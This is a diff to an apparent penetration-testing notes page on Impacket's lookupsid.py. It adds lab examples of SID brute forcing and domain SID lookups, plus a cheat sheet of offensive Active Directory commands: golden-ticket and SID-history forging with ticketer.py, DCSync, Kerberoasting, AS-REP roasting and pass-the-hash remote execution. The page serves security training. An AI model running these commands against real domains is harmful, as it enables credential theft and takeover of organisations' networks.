@@ -9,6 +9,144 @@ hideFooterPagination: true
 
 {/* Generated from Commands/lookupsid.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## lookupsid.py: choose the operation and read the result
+
+Enumerate SID/RID mappings through RPC.
+
+### What the result establishes
+
+Keep the domain SID and RID-derived object names together when building a user/group map.
+
+### Prerequisites and common failures
+
+A SID lookup result is an identity lead, not a verified password or a complete membership graph; RPC policy may limit enumeration.
+
+### Example 1: Commands
+
+Run in: **Kali**.
+
+```bash
+impacket-lookupsid 'DOMAIN/USER@DC_IP'
+```
+
+### Example 2: Looking for the Domain SID
+
+Run in: **Saved lab example**.
+
+```shellsession
+grcic550@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
+
+Password:
+
+[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
+```
+
+Saved context: [Child to Parent Trusts - Linux — Looking for the Domain SID](/active-directory/trusts-child-parent-linux#looking-for-the-domain-sid). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Cross-domain / cross-forest
+
+Run in: **Saved lab example**.
+
+```bash
+# child -> parent: forge an inter-realm TGT with the child krbtgt + SID history (sidHistory of Enterprise Admins)
+ticketer.py -nthash <krbtgt_hash> -domain-sid <child_sid> -extra-sid <root_sid>-519 -domain child.corp.local Administrator
+# intra-forest trust key abuse
+lookupsid.py $DOMAIN/USER:PASS@$DC       # get SIDs
+```
+
+Saved context: [Active Directory Trusts: Quick Reference — Cross-domain / cross-forest](/active-directory/domain-trusts#cross-domain-/-cross-forest). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: Original captured examples
+
+Run in: **Saved lab example**.
+
+```bash
+# remote execution (need admin creds or hash)
+psexec.py $DOMAIN/admin:PASS@$IP            # SYSTEM shell (noisy)
+wmiexec.py $DOMAIN/admin@$IP -hashes :<nt>  # semi-interactive, quieter
+smbexec.py / atexec.py / dcomexec.py        # alternatives
+# credentials
+secretsdump.py $DOMAIN/USER:PASS@$DC -just-dc   # DCSync
+GetUserSPNs.py $DOMAIN/USER:PASS -dc-ip $DC -request     # Kerberoast
+GetNPUsers.py  $DOMAIN/ -usersfile users.txt -no-pass    # AS-REP roast
+# tickets
+getTGT.py $DOMAIN/USER:PASS ; export KRB5CCNAME=USER.ccache
+ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator   # golden
+# shares / lookups
+smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
+```
+
+Saved context: [Impacket: Script Quick Reference — Original captured examples](/tools/impacket#original-captured-examples). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: Grabbing the Domain SID & Attaching to Enterprise Admin's RID
+
+Run in: **Saved lab example**.
+
+```shellsession
+grcic550@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
+
+Password:
+[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
+498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: INLANEFREIGHT\administrator (SidTypeUser)
+501: INLANEFREIGHT\guest (SidTypeUser)
+502: INLANEFREIGHT\krbtgt (SidTypeUser)
+512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
+513: INLANEFREIGHT\Domain Users (SidTypeGroup)
+514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
+515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
+516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
+517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
+518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
+519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
+```
+
+Saved context: [Child to Parent Trusts - Linux — Grabbing the Domain SID & Attaching to Enterprise Admin's RID](/active-directory/trusts-child-parent-linux#grabbing-the-domain-sid-&-attaching-to-enterprise-admins-rid). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: Performing SID Brute Forcing using lookupsid.py
+
+Run in: **Saved lab example**.
+
+```shellsession
+grcic550@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
+
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Brute forcing SIDs at 172.16.5.240
+[*] StringBinding ncacn_np:172.16.5.240[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
+500: LOGISTICS\Administrator (SidTypeUser)
+501: LOGISTICS\Guest (SidTypeUser)
+502: LOGISTICS\krbtgt (SidTypeUser)
+512: LOGISTICS\Domain Admins (SidTypeGroup)
+513: LOGISTICS\Domain Users (SidTypeGroup)
+514: LOGISTICS\Domain Guests (SidTypeGroup)
+515: LOGISTICS\Domain Computers (SidTypeGroup)
+516: LOGISTICS\Domain Controllers (SidTypeGroup)
+517: LOGISTICS\Cert Publishers (SidTypeAlias)
+520: LOGISTICS\Group Policy Creator Owners (SidTypeGroup)
+521: LOGISTICS\Read-only Domain Controllers (SidTypeGroup)
+522: LOGISTICS\Cloneable Domain Controllers (SidTypeGroup)
+525: LOGISTICS\Protected Users (SidTypeGroup)
+526: LOGISTICS\Key Admins (SidTypeGroup)
+553: LOGISTICS\RAS and IAS Servers (SidTypeAlias)
+571: LOGISTICS\Allowed RODC Password Replication Group (SidTypeAlias)
+572: LOGISTICS\Denied RODC Password Replication Group (SidTypeAlias)
+1001: LOGISTICS\lab_adm (SidTypeUser)
+1002: LOGISTICS\ACADEMY-EA-DC02$ (SidTypeUser)
+1103: LOGISTICS\DnsAdmins (SidTypeAlias)
+1104: LOGISTICS\DnsUpdateProxy (SidTypeGroup)
+1105: LOGISTICS\INLANEFREIGHT$ (SidTypeUser)
+1106: LOGISTICS\htb-student_adm (SidTypeUser)
+```
+
+Saved context: [Child to Parent Trusts - Linux — Performing SID Brute Forcing using lookupsid.py](/active-directory/trusts-child-parent-linux#performing-sid-brute-forcing-using-lookupsid-py). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Enumerate SID/RID mappings through RPC.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=lookupsid) · [All tools](/index)
@@ -20,6 +158,13 @@ Replace UPPER_CASE values with your lab values.
 ```bash
 impacket-lookupsid 'DOMAIN/USER@DC_IP'
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [rpcclient: Users, Groups, and Domain Policy — Example 1: Commands](/enumeration/rpcclient-cheat-sheet#example-1-commands-2)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
@@ -41,6 +186,13 @@ ticketer.py -nthash <krbtgt_hash> -domain-sid <child_sid> -extra-sid <root_sid>-
 # intra-forest trust key abuse
 lookupsid.py $DOMAIN/USER:PASS@$DC       # get SIDs
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Trusts: Quick Reference — Cross-domain / cross-forest](/active-directory/domain-trusts#cross-domain-/-cross-forest) · [rpcclient: Users, Groups, and Domain Policy — Example 3: Cross-domain / cross-forest](/enumeration/rpcclient-cheat-sheet#example-3-cross-domain-/-cross-forest)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -69,6 +221,13 @@ Password:
 519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [rpcclient: Users, Groups, and Domain Policy — Example 5: Grabbing the Domain SID & Attaching to Enterprise Admin's RID](/enumeration/rpcclient-cheat-sheet#example-5-grabbing-the-domain-sid-&-attaching-to-enterprise-admins-rid) · [Child to Parent Trusts - Linux — Grabbing the Domain SID & Attaching to Enterprise Admin's RID](/active-directory/trusts-child-parent-linux#grabbing-the-domain-sid-&-attaching-to-enterprise-admins-rid)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Looking for the Domain SID">
@@ -84,6 +243,13 @@ Password:
 
 [*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [rpcclient: Users, Groups, and Domain Policy — Example 2: Looking for the Domain SID](/enumeration/rpcclient-cheat-sheet#example-2-looking-for-the-domain-sid) · [Child to Parent Trusts - Linux — Looking for the Domain SID](/active-directory/trusts-child-parent-linux#looking-for-the-domain-sid)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -127,6 +293,13 @@ Password:
 1106: LOGISTICS\htb-student_adm (SidTypeUser)
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [rpcclient: Users, Groups, and Domain Policy — Example 6: Performing SID Brute Forcing using lookupsid.py](/enumeration/rpcclient-cheat-sheet#example-6-performing-sid-brute-forcing-using-lookupsid-py) · [Child to Parent Trusts - Linux — Performing SID Brute Forcing using lookupsid.py](/active-directory/trusts-child-parent-linux#performing-sid-brute-forcing-using-lookupsid-py)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Original captured examples">
@@ -151,6 +324,13 @@ ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator   #
 smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [rpcclient: Users, Groups, and Domain Policy — Example 4: Original captured examples](/enumeration/rpcclient-cheat-sheet#example-4-original-captured-examples) · [Impacket: Script Quick Reference — Original captured examples](/tools/impacket#original-captured-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Impacket: Script Quick Reference">
@@ -165,6 +345,21 @@ Context from the notebook: SID lookup over SMB/RPC lookupsid.py  /  impacket-loo
 lookupsid.py
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Impacket: Script Quick Reference — Existing notes and worked examples](/tools/impacket#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Active Directory Enumeration from Linux](/active-directory/enumeration-linux)
+
+{/* VAULT_RELATED_END */}
